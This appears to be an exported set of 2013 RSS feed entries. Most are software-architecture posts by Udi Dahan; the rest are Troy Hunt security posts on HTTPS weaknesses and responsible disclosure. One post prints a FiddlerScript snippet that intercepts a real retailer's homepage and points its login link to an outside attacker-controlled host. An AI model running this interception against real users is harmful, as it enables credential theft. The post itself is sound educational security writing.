a machine in the cloud with NServiceBus pre-installed on it ready to go.</p><p>We’ve even got a scale-out lab where you’ll see just how easy it is to build a 4 machine NServiceBus solution.</p><p><a href=\"http://particular.net/HandsOnLabs\">Try the labs</a>.</p><h3>Modeling</h3><p>I’ve talked before about some modeling tools we’ve been working on for NServiceBus and I’m happy to say that they’re now ready for public beta. Instead of the name NServiceBus Studio (which overlapped far to much with Visual Studio), we’re now calling this <a href=\"http://particular.net/ServiceMatrix\">ServiceMatrix</a>.</p><p><img src=\"http://particular.net/Media/Default/Studio/ServiceMatrixScreen.png\" alt=\"ServiceMatrix\" title=\"ServiceMatrix\" /></p><p>ServiceMatrix makes building message-driven service-oriented solutions an absolute joy allowing you to operate at much higher levels of abstraction. Find out more <a href=\"http://particular.net/ServiceMatrix\">here</a>.</p><h3>Debugging</h3><p>While the looser-coupling of message-driven systems makes them more scalable and maintainable, it does make debugging harder since you can’t just step-through one function to another when everything is invoked asynchronously.</p><p>For that reason, we’ve been working on visualization and management tooling to make things easier. By leveraging the built-in auditing of NServiceBus, we can show you the message causation chain – which command caused which event, which in turn caused what other messages to flow. We also hook into the error queue to show you when messages fail (in orange below) and the full stack trace of the exception.</p><p>Of course, you can always see the full body and headers of each message.</p><p><img src=\"http://particular.net/Media/Default/Profiler/InsightScreen.png\" alt=\"ServiceInsight\" title=\"ServiceInsight\" /></p><p>This tool, called <a href=\"http://particular.net/ServiceInsight\">ServiceInsight</a> is now in its second beta and the feedback has been overwhelming – “oh my God, how could you have waited this long to release this?! Even our testers and admins are using it.”.</p><h2>In Particular</h2><p><a href=\"http://particular.net\"><img src=\"http://particular.net/Themes/ParticularSoftware/Styles/images/logo.png\" title=\"Particular Software\" alt=\"Particular Software\" style=\"float:right; margin-left:10px; margin-bottom:10px; margin-right:10px; border:none;\" /></a>You might have noticed that all of these links are going to the <a href=\"http://particular.net\">Particular.net</a> domain, and that the existing NServiceBus.com now redirects there as well.</p><p>After talking things over internally, the team agreed that we wanted to be much more than “just” a service bus. The new products I mentioned above are the first step in that direction, but there is more to come.</p><p>We wanted a name that wouldn’t pigeon-hole us but, I’ve got to tell you, it’s extremely hard to find a name for a software company (and a corresponding domain) that isn’t already taken.</p><p>When we hit on the name Particular Software and saw that ParticularSoftware.com was open, we were quite thrilled. You see, we’re very particular about the software we use, and we want to write software for people who are just as discerning as us. Getting Particular.net was nice too.</p><h3>In closing</h3><p>I want to take this opportunity to thank our community for believing in us all this time, and an especially big thank you to our <a href=\"http://particular.net/champions\">community champions</a> who have been gently shepherding thousands of new users in their first NServiceBus steps.</p><p>To our partners that have been building solutions for their customers on NServiceBus – you have our deepest appreciation. We’ve also got some new things coming just for you that you’ll really like. </p><blockquote><p>By the way, if you’re an independent consultant or working at a consulting company and would like partner with us, please <a href=\"http://particular.net/partners\">reach out to us</a>.</p></blockquote><p>And, although we’re constantly growing the team – it seems like there’s always so much more to be done. When I started down this path over 7 years ago, I never imagined that this could go on this long. Today, I’m pretty sure that there’s at least another 7 years more to go. </p><p>We’re dedicated to making this the best service platform out there.</p><p><a href=\"http://particular.net/service-platform\">Check it out</a>.</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=4YK220HTDWc:EmwxLPaYhzk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=4YK220HTDWc:EmwxLPaYhzk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=4YK220HTDWc:EmwxLPaYhzk:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=4YK220HTDWc:EmwxLPaYhzk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=4YK220HTDWc:EmwxLPaYhzk:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/4YK220HTDWc\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1141}}
{"k":"0000000084","o":"0000005491","v":"001"}
{"_id":1142,"_uid":1142,"_dt":1373742620941,"_s":"ecc12a9431892f1c9d4b6032e5831ab9"}
{"subscription":{"$wrap":"$oid","v":44},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/9Xh_TORUFQ8/the-security-futility-that-is-embedding.html","title":"The security futility that is embedding secure login forms within insecure pages","published":{"$wrap":"$date","v":1372064160001,"h":"2013-06-24T08:56:00.001Z"},"starred":false,"read":false,"content":"<p>I’ve been writing a bunch of content around HTTPS lately and recording videos to demonstrate the ease with which insecure implementations of SSL can be broken. For example, there was the piece on<a href=\"http://www.troyhunt.com/2013/05/heres-why-you-cant-trust-ssl-logos-on.html\">why you can’t trust SSL logos</a>, then how<a href=\"http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html\">loading login forms over HTTP but posting to HTTPS is pointless</a>and most recently, why those<a href=\"http://www.troyhunt.com/2013/06/understanding-risk-of-mixed-content.html\">mixed content warnings mean easy pickings for attackers on the transport layer</a>. All of these involve working demonstrations against real sites who just don’t quite get HTTPS.</p><p>Today’s example is about what happens when a login page is loaded securely, albeit embedded within an insecure page. This is a common security anti-pattern and you’ll see it on many sites. The example in the video is from<a href=\"http://www.countdown.co.nz/\">Countdown in New Zealand</a>but again, there are countless others out there. Take a look at the video then I’ll come back to how I mounted the attack:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/Ma9uxvXv_00?feature=player_embedded\" frameborder=\"0\" allowfullscreen=\"\"></iframe><p>Make sense? In short, you can never trust the HTTP component of the communication and without the ability to see the URL in the browser<em>loaded over an HTTPS address with a valid certificate</em>, the SSL implementation is almost useless.</p><a name='more'></a><p>The mechanics of how I’ve demonstrated attacks against insufficient use of SSL involves using<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler script</a>. Many of you may already be familiar with<a href=\"http://fiddler2.com/\">Fiddler</a>, the scripting option gives us the ability to manipulate unencrypted traffic on the wire just as an attacker might at any point in the network communication. Clearly an attacker at, say an ISP or running a rogue wireless hotspot wouldn’t be running Fiddler, but the mechanics of manipulating requests and responses is similar with other tools.</p><p>In this example I simply added the following script in the OnBeforeResponse event:</p><pre class=\"code\"><span style=\"color: blue\">if</span><span style=\"color: gray\">(</span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">HostnameIs</span><span style=\"color: gray\">(</span><span style=\"color: maroon\">\"www.countdown.co.nz\"</span><span style=\"color: gray\">)&&</span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">PathAndQuery</span><span style=\"color: gray\">==</span><span style=\"color: maroon\">\"/\"</span><span style=\"color: gray\">) {<br></span><span style=\"color: green\">// Remove any compression or chunking<br></span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">utilDecodeResponse</span><span style=\"color: gray\">();<br><br></span><span style=\"color: blue\">var</span><span style=\"color: black\">oBody</span><span style=\"color: gray\">=</span><span style=\"color: black\">System</span><span style=\"color: gray\">.</span><span style=\"color: black\">Text</span><span style=\"color: gray\">.</span><span style=\"color: black\">Encoding</span><span style=\"color: gray\">.</span><span style=\"color: black\">UTF8</span><span style=\"color: gray\">.</span><span style=\"color: black\">GetString</span><span style=\"color: gray\">(</span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">responseBodyBytes</span><span style=\"color: gray\">);<br><br></span><span style=\"color: green\">// Change the path of the login form<br></span><span style=\"color: black\">oBody</span><span style=\"color: gray\">=</span><span style=\"color: black\">oBody</span><span style=\"color: gray\">.</span><span style=\"color: black\">replace</span><span style=\"color: gray\">(</span><span style=\"color: maroon\">\"/onecard/panels/customer-login\"</span><span style=\"color: gray\">,</span><span style=\"color: maroon\"><br>\"http://hackyourself.troyhunt.com/Countdown\"</span><span style=\"color: gray\">);<br><br></span><span style=\"color: green\">// Set the response body to the changed body string<br></span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">utilSetResponseBody</span><span style=\"color: gray\">(</span><span style=\"color: black\">oBody</span><span style=\"color: gray\">);<br>}</span></pre><p>In other words, when the homepage is loaded simply replace the link to the login form from the original one to the attacker’s one that looks the same. Job done.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/9Xh_TORUFQ8\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1142}}
{"k":"0000000084","o":"0000003431","v":"001"}
{"_id":1143,"_uid":1143,"_dt":1373742620941,"_s":"81886057779ac9175f9b0d181e2675d1"}
{"subscription":{"$wrap":"$oid","v":45},"link":"http://feedproxy.google.com/~r/UdiDahan-TheSoftwareSimplist/~3/yrSNzdbpUXA/","title":"Ask Udi 1: Alternative Architectures&Preaching to the Unconverted","published":{"$wrap":"$date","v":1372416608000,"h":"2013-06-28T10:50:08.000Z"},"starred":false,"read":false,"content":"<p>As promised, the podcast is back.</p><p><a href=\"http://traffic.libsyn.com/askudi/ask-udi-1-alternative-architectures-preaching-to-the-unconverted.mp3\">Download episode 1 here</a>      and then      <a href=\"http://askudi.libsyn.com/rss\">Subscribe to the feed</a>.</p><p>There were 16 questions submitted and a couple hundred votes for the various topics. I was able to cover the top two questions.</p><p>Do you have a question you want to ask?<br />Want to vote on which questions will be answered next week?<br /><a href=\"http://askudi.uservoice.com/forums/211744-general\">Click here</a></p><h3>This week’s questions</h3><p>Rob Eisenberg asked:</p><blockquote><p>It seems that every project I walk into has the exact same architecture, regardless of what the company is building. It’s that standard 3-tier pattern: data-business-presentation. But, there are other large-scale architectural patterns available. I’d love to hear some case studies that pair business problems with the rationale for choosing an “alternative architecture.”</p></blockquote><p>And since it’s not just about knowing the right approach but also being able to convince others, I included Rvonwink’s question too:</p><blockquote><p>Some of us see the genuine benefits of pub/sub, EDA and SOA design. However, how do you go about persuading the cynics, time pressed and uninformed:</p><p>Our developers hate debugging pub/sub models; Others love the ’simplicity’ of monolithic domains; Our DBA questions why messaging is required (since “the bus simply persists messages elsewhere”); Our sys admins hate deploying new applications or changing the deployment topology; Our boss is scared to tell the business there is a little extra work to start splitting apart services.</p></blockquote><h3>Next week</h3><p>Currently the top questions for next week are:</p><ul><li>Composite UI, Business Components and Deployment</li><li>How to handle predetermined technology choices</li><li>How do you manage NULL pointer exception in general?</li></ul><p>What would you like to hear? <a href=\"http://askudi.uservoice.com/forums/211744-general\">Let me know</a>.</p><p>Until next week…</p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=yrSNzdbpUXA:zkXiUIyhYsg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=yrSNzdbpUXA:zkXiUIyhYsg:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=yrSNzdbpUXA:zkXiUIyhYsg:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=yrSNzdbpUXA:zkXiUIyhYsg:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=yrSNzdbpUXA:zkXiUIyhYsg:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/yrSNzdbpUXA\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1143}}
{"k":"0000000084","o":"0000002905","v":"001"}
{"_id":1144,"_uid":1144,"_dt":1373742620941,"_s":"e5354e5dd80a2e2d1699a13b82d5b26a"}
{"subscription":{"$wrap":"$oid","v":44},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/qRt9JTyYGKk/talking-with-scott-hanselman-on.html","title":"Talking with Scott Hanselman on honeypots, pineapples and SSL","published":{"$wrap":"$date","v":1369642440001,"h":"2013-05-27T08:14:00.001Z"},"starred":false,"read":false,"content":"<p>For many of you,<a href=\"http://www.hanselman.com/\">Scott Hanselman</a>will need no introduction and is a very familiar face, voice and writer. Among the many good things that Scott does to support the web development community (and that’s not just the Microsoft folks either), he’s also the man behind the<a href=\"http://www.hanselminutes.com/372/are-you-secure-wifi-honeypots-pineapples-and-ssl-with-troy-hunt\">Hanselminutes podcast</a>which I was very happy to join him on recently. In fact this remains one of the very few podcasts where I actually listen to every episode – regardless of the direct relevance to me – simply because it’s delivered in such a professional manner and I know I’m going to learn something each time.</p><p>The podcast has gone out under the title<a href=\"http://www.hanselminutes.com/372/are-you-secure-wifi-honeypots-pineapples-and-ssl-with-troy-hunt\">Are you secure? WiFi Honeypots, Pineapples and SSL with Troy Hunt</a>which is pretty self-explanatory. As per the title, we mostly discuss the risks presented by using public wifi plus the importance of HTTPS for those of us who are building web apps. Let me share some supplementary material which I’ve either touched on in that talk or will be of relevance to interested listeners:</p><ol><li><a href=\"http://www.troyhunt.com/2011/01/ssl-is-not-about-encryption.html\">SSL is not about encryption</a></li><li><a href=\"http://www.troyhunt.com/2011/11/owasp-top-10-for-net-developers-part-9.html\">OWASP Top 10 for .NET developers part 9: Insufficient Transport Layer Protection</a></li><li><a href=\"http://www.troyhunt.com/2013/04/5-ways-to-implement-https-in.html\">5 ways to implement HTTPS in an insufficient manner (and leak sensitive data)</a></li><li><a href=\"http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html\">Your login form posts to HTTPS, but you blew it when you loaded it over HTTP</a></li><li><a href=\"http://www.troyhunt.com/2013/04/the-beginners-guide-to-breaking-website.html\">The beginners guide to breaking website security with nothing more than a Pineapple</a></li><li><a href=\"http://www.troyhunt.com/2013/05/pineapple-surprise-mixing-trusting.html\">Pineapple Surprise! Mixing trusting devices with sneaky Wi-Fi at #wdc13</a></li></ol><p>There’s a lot more related content beneath those but that’s a good starting point. I hope you enjoy the podcast!</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/qRt9JTyYGKk\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1144}}
{"k":"0000000084","o":"0000022484","v":"001"}
{"_id":1145,"_uid":1145,"_dt":1373742620942,"_s":"56b53d21439e9e7f4f8bcf46bede831e"}
{"subscription":{"$wrap":"$oid","v":44},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/fhxbf8LPLU8/the-responsibility-of-public-disclosure.html","title":"The responsibility of public disclosure","published":{"$wrap":"$date","v":1369773480001,"h":"2013-05-28T20:38:00.001Z"},"starred":false,"read":false,"content":"<p>There’s this debate that goes round and round about a process that’s commonly known as responsible disclosure or in other words, notifying the owner of a system that their security sucks and giving them the opportunity to fix it rather than telling the great unwashed masses and letting them have at a vulnerable system. The theory goes that responsible disclosure is the<em>ethical</em>thing to do whilst airing website security dirty laundry publicly makes you an irresponsible cowboy, or something to that effect.</p><p>But of course these things are not black and white. On a daily basis I’ll see tweets about how a website is storing credentials in plain text: “Hey [insert name here], what’s the go with emailing my password, aren’t you protecting it?”. Is this “responsible”? I think it’s fair to say it’s not<em>irresponsible</em>, I mean the risk is obvious, right?</p><p>How about security risks such as an XSS flaw which might be a little more grey, but is still shared frequently in public? It’s not exactly going to land you the mother lode of sensitive data in a couple of clicks, but it could be used as part of a more sophisticated attack. Or move right on to the other end of the scale where serious flaws lead to serious breaches. It might be default credentials on an admin system or publicly accessible backups, the point is it’s in another realm of risk and impact altogether.</p><p>Anyway, the reason for this post is that a number of events over recent times have given me pause for what<em>I</em>consider responsible disclosure. These events are numerous and include incidents where I’ve ticked every responsibility box in the book and incidents where I’ve been accused of being, well, a cowboy. I wanted to capture – with as much cohesion as possible – what I consider to be responsible disclosure because sure enough, I’ll be called on this again in the future and I want to have a clear point of view that simply won’t fit into 140 characters.</p><p>I’d like to start with two disclosure stories that took very different tacks with different outcomes for both the sites and me personally. Here’s what happened:</p><a name='more'></a><h4>Disclosure story 1: Westfield</h4><p>Two years ago I wrote about<a href=\"http://www.troyhunt.com/2011/09/find-my-car-find-your-car-find.html\">Find my car, find your car, find everybody’s car; the Westfield’s iPhone app privacy smorgasbord</a>. In short, the Westfield shopping centre here in Sydney down at Bondi had an app to help you find your car but it readily disclosed the license plate of every vehicle in the centre’s 2,550 car spaces via an improperly protected JSON feed. Oops.</p><p>This went straight up onto my blog and subsequently,<a href=\"http://www.theaustralian.com.au/australian-it/westfield-iphone-app-in-privacy-fiasco/story-e6frgakx-1226137939073\">straight into the national media</a>. I posted it in the morning and just a few hours later the system was offline. Shortly after that I had a call from the (rather sheepish) developers of it in the US. By mid-afternoon the General Manager had<a href=\"http://www.troyhunt.com/2011/09/find-my-car-find-your-car-find.html#comment-309304475\">commented on my blog post</a>and later made contact personally. He called me that night and we had a very constructive discussion; there wasn’t any anger or malice, it was entirely “Holy shit, this isn’t cool, how do we fix it” which IMHO, was entirely the correct response as it lead to the system getting fixed very quickly.</p><p>tl;dr: the risk was removed almost instantly, the developers were open and receptive, the management was appreciative and hopefully developers everywhere got to learn a thing or two about securing their APIs. Perhaps most importantly though, at-risk customers were spared as quickly as possible from the potential ramifications of disclosing their personal movements.</p><h4>Disclosure story 2: Black and Decker</h4><p>This is very timely as it all took place last week. As I wrote about just yesterday in<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">Security is hard, insecurity is easy – demonstrating a simple misconfiguration risk</a>, Black and Decker had exposed ELMAH logs. Their unfortunate architecture decision to store credentials in cookies (you heard me) meant these were recorded in the logs which numbered 50,000+. So here we have a veritable treasure trove of usernames, passwords, IP addresses, request headers, internal code and other titbits – clearly something to be disclosed privately and obviously given the significance they’d take it seriously and respond promptly. Or so I thought.</p><p>After recording the video for the aforementioned post on Monday afternoon last week (these are all Sydney times), I quickly reached out to Black and Decker on Twitter:</p><p><a href=\"https://twitter.com/troyhunt/status/336384092880908288\"><img width=\"487\" height=\"259\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"@Black_DeckerUS is there a private channel I can report a serious security vulnerability on your website through? Or follow so I can DM.\" src=\"http://lh3.ggpht.com/-JaFPvXVVXsQ/UaUVZmBvs6I/AAAAAAAAFWY/AnK83TgrJME/SNAGHTML3270d742.png?imgmax=800\" border=\"0\"></a></p><p>I didn’t hear anything back over the next few hours but given their Twitter account apparently doesn’t come online until 8am in Maryland (22:00 for me), that’s not surprising. Nearly an hour after they should have come online and still no contact so I send an email after finding a support address on the website:</p><p><a href=\"http://lh4.ggpht.com/-qhr0qx3cDrQ/UaUVbNeeLiI/AAAAAAAAFWg/lJhkQWN1r6Q/s1600-h/SNAGHTML30565432.png\"><img width=\"731\" height=\"373\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"First email to Black and Decker\" src=\"http://lh6.ggpht.com/-i0--pnMa9o0/UaUVc9HZ4bI/AAAAAAAAFWo/-Ac7AOQ-Q6s/SNAGHTML3056543_thumb.png?imgmax=800\" border=\"0\"></a></p><p>The next morning I get up and there’s a DM waiting for me that had come in at 04:12:</p><p><a href=\"http://lh5.ggpht.com/-dkt5OSfvE7E/UaUVe8D8XbI/AAAAAAAAFWw/lagW2UwG-98/s1600-h/image72.png\"><img width=\"406\" height=\"88\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Feel free to send us contact information and we can have someone reach out to you.\" src=\"http://lh3.ggpht.com/-q3nNUAnBhDU/UaUVga6khhI/AAAAAAAAFW4/Iqaea8HOWKw/image7_thumb.png?imgmax=800\" border=\"0\"></a></p><p>Great! So I write up a response about checking their ELMAH and… can’t send, not following. Great, back to public Twitter then:</p><p><a href=\"https://twitter.com/troyhunt/status/336589704919142400\"><img width=\"487\" height=\"232\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"@Black_DeckerUS hi, I got your DM re website security but I can't respond privately unless you follow me.\" src=\"http://lh5.ggpht.com/-5PK06aj3MP4/UaUVgwiMDRI/AAAAAAAAFXA/Xn66sEJBqls/SNAGHTML3edc8742.png?imgmax=800\" border=\"0\"></a></p><p>No response a few hours later so it’s back to the masses to try and get some help:</p><p><a href=\"https://twitter.com/troyhunt/status/336634077211938818\"><img width=\"487\" height=\"292\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"I'm having no success privately getting through to @Black_DeckerUS about a very major vuln, anyone got a contact there?\" src=\"http://lh6.ggpht.com/-ukJmY9oHJQI/UaUVhbkHH5I/AAAAAAAAFXI/6LZ2V6iQkNk/SNAGHTML40373542.png?imgmax=800\" border=\"0\"></a></p><p>Night comes and goes, still no response so I try again the next day:</p><p><a href=\"https://twitter.com/troyhunt/status/336958960785563648\"><img width=\"487\" height=\"319\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Still can't get a response from @Black_DeckerUS re a very serious vuln in their website - can't DM and no response to email. Any contacts?\" src=\"http://lh6.ggpht.com/-2WdWqCemezc/UaUVh09dM2I/AAAAAAAAFXM/KlWGyKXd8F0/SNAGHTML41afbc42.png?imgmax=800\" border=\"0\"></a></p><p>It’s now 38 hours since I’ve tried making contact through two different channels, they know there’s “a serious security vulnerability” as they’ve DM’d me (without a follow-back so I can respond privately) and I still can’t get through. Time to go local and see if someone down here can help:</p><p><a href=\"http://lh6.ggpht.com/-06tch22MM8k/UaUVifbHQuI/AAAAAAAAFXY/Ut3MJA9X41M/s1600-h/SNAGHTML5426d832.png\"><img width=\"731\" height=\"365\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Second email to Black and Decker\" src=\"http://lh6.ggpht.com/-OVU8NR1SR9c/UaUVjKrwd2I/AAAAAAAAFXg/n4iyOvGsx8c/SNAGHTML5426d83_thumb.png?imgmax=800\" border=\"0\"></a></p><p>The day passes and nobody down here responds then<a href=\"https://twitter.com/anders_abel/status/337062950521163776\">a friendly Twitter follower suggests contacting the admin address on the DNS record</a>so it’s back to the email again:</p><p><a href=\"http://lh6.ggpht.com/-oEOzRRCY_tI/UaUVkrEaPyI/AAAAAAAAFXo/-xhfFy_HnuI/s1600-h/SNAGHTML1f6d31532.png\"><img width=\"731\" height=\"371\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Third email to Black and Decker\" src=\"http://lh6.ggpht.com/-nh-1Hmq79Ps/UaUVmkbqMTI/AAAAAAAAFXw/8E0rhRNohQ8/SNAGHTML1f6d3153_thumb.png?imgmax=800\" border=\"0\"></a></p><p>Still nothing come through overnight, let’s give Twitter another go a put a bit more urgency into it:</p><p><a href=\"https://twitter.com/troyhunt/status/337307898755547136\"><img width=\"487\" height=\"323\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"I *still* can't get hold of @Black_DeckerUS re a major security risk. You've got publicly accessible customer data; email or DM for details.\" src=\"http://lh5.ggpht.com/-VFjJhllwHuw/UaUVoMizhgI/AAAAAAAAFX4/RfhZN7edL9k/SNAGHTML541013a42.png?imgmax=800\" border=\"0\"></a></p><p>Another friendly follower<a href=\"https://twitter.com/tifkin_/status/337210616806785024\">suggests using LinkedIn to find someone</a>so I jump over there and manage to find an “Information Technology and Risk Management Executive” who actually has a common previous employer to me and several common contacts. This looks like a winner:</p><p><img width=\"519\" height=\"402\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Contacting via LinkedIn\" src=\"http://lh3.ggpht.com/-3n7g-Lz3MG0/UaUVpl3XS7I/AAAAAAAAFYA/dW7n5OmCZok/image2.png?imgmax=800\" border=\"0\"></p><p>This is now the 9th time I’ve tried to get in touch with Black and Decker. Finally<em>someone</em><em>from Microsoft</em>responds via Twitter and advises they have a relationship with Black and Decker. I privately email their @microsoft.com address on the evening of the 23rd (now the 10th contact) including the<a href=\"https://code.google.com/p/elmah/wiki/SecuringErrorLogPages\">ELMAH Securing Error Log Pages</a>link and they promptly pass it on. Come the morning of the 24th, here’s what happens:</p><p><img width=\"609\" height=\"469\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"ELMAH log now protected at /elmah.axd\" src=\"http://lh4.ggpht.com/-GUFHmN1dpUc/UaUVqiTwnEI/AAAAAAAAFYI/TCOXa70NmcA/image311.png?imgmax=800\" border=\"0\"></p><p>Success! Looks like I’ve finally gotten through! Except, well, I hadn’t really:</p><p><img width=\"609\" height=\"469\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"ELMAH log not protected at /foo/elmah.axd\" src=\"http://lh6.ggpht.com/-yrbc41G-kZE/UaUVsPH0tRI/AAAAAAAAFYQ/C1SGG9iHc3s/image61.png?imgmax=800\" border=\"0\"></p><p>This is a little issue that came up in<a href=\"http://www.troyhunt.com/2012/01/aspnet-session-hijacking-with-google.html\">my original post on session hijacking with Google and ELMAH</a>and it’s because the handler is registered globally yet explicitly secured only when it appears in the root. It’s a simple fix that’s (now) explained very clearly on the ELMAH site (which I’d sent them), the handler just needs to be registered beneath the location in which it’s used.</p><p>So the 11th contact goes out and it’s back to Microsoft because I<em>still</em>haven’t had any personal contact from Black and Decker. I had a response from Microsoft just 9 minutes later even though it was about 19:30 local so kudos to them for their proactivity. Remember, this was all on the morning of the 24th (Friday last week) but by late that evening my time ELMAH was still accessible. Granted, it was evening over in the US but we’re now more than 100 hours into this saga.</p><p>Finally, come Saturday morning, ELMAH is secure. That’s four and a half days of time wasted from initial contact to securing the risk. Remember, this involved customers’ usernames and passwords on public display, no doubt in many cases the same ones they use for their email or to do their banking.</p><p>4 days after everything was resolved and 9 days since I first raised the risk, I’ve also not had any response from Black and Decker. Zero. Zip. Nada. Not a “Thanks mate” nor a “Mighty nice of you to point this out privately”, no “How might we fix this?” or “Is there anything else we should look at?”, just absolute silence. Now I don’t privately disclose in order to achieve any sort of personal benefit, but by my moral compass when you do someone a favour – particularly one that could save them a great deal of inconvenience – a little gratitude in response goes a long way.</p><p>This incident plus the Westfield one and literally dozens of others – some I’ve written about, many I’ve not – lead me to wonder: what circumstances predicate themselves to private disclosure? When is public a better option? I broke it down into three measures, let me explain.</p><h4>1. What is the purpose of disclosing the risk?</h4><p>Particularly when a public disclosure lands on the front page of the news and consequently on the CTO’s (or even CEO’s) desk, inevitably the question comes up – why’d he do it? What’s in it for him? What does this guy want from us?</p><p>On numerous occasions, after making a public disclosure I’ve had private responses which clearly indicate the sender is under the impression that I’m after money. You can almost read “Ok, how much do you want to help us fix this thing?” between the lines of an otherwise polite but curt response. This can<em>never</em>be the intent of disclosure, doing this would amount to nothing less than running an extortion racket.</p><p>The purpose<em>cannot</em>be self-serving, when this is the case there’s nothing to stop you from running around calling out every single vuln you find and to hell with the consequences. Whilst there’s unarguably a reputation boost from a carefully constructed public disclosure, there has to be a “greater good”.</p><p>The single most significant beneficiary of public disclosures I make are software developers. I want to help these guys understand the ins and outs of website security and nothing gets their attention more than publicly calling out examples. But just as importantly, you have to help them understand<em>why</em>the risks are, well, risks. Also just as importantly, you need help them understand how to fix those risks, not just stand there and give a “Ha Ha” Nelson Muntz style, that’s really not going to help anyone.</p><p><img width=\"400\" height=\"250\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Nelson Muntz - Ha Ha!\" src=\"http://lh5.ggpht.com/-lj7gA6jC_dE/UaUVt-0MNsI/AAAAAAAAFYY/8KQ3957hMOs/seven_bullies_062.png?imgmax=800\" border=\"0\"></p><p>Of course the other beneficiary is those who would be impacted if the risk was exploited. If disclosing the risk will lead to the site owner rectifying it<em>before</em>customers can be adversely impacted, then that’s a good thing. Which leads me neatly to the second point.</p><h4>2. Who is the victim if it’s exploited?</h4><p>When a vuln is disclosed, naturally there is a risk that someone will then exploit it. Who is impacted if that happens is extremely important because in the scheme of exploited website risks there are really two potential victims: the users of the site and the site owner.</p><p>In this context, website users are innocent parties, they’re simply using a service and expecting that their info will be appropriately protected. Public disclosure must not impact these 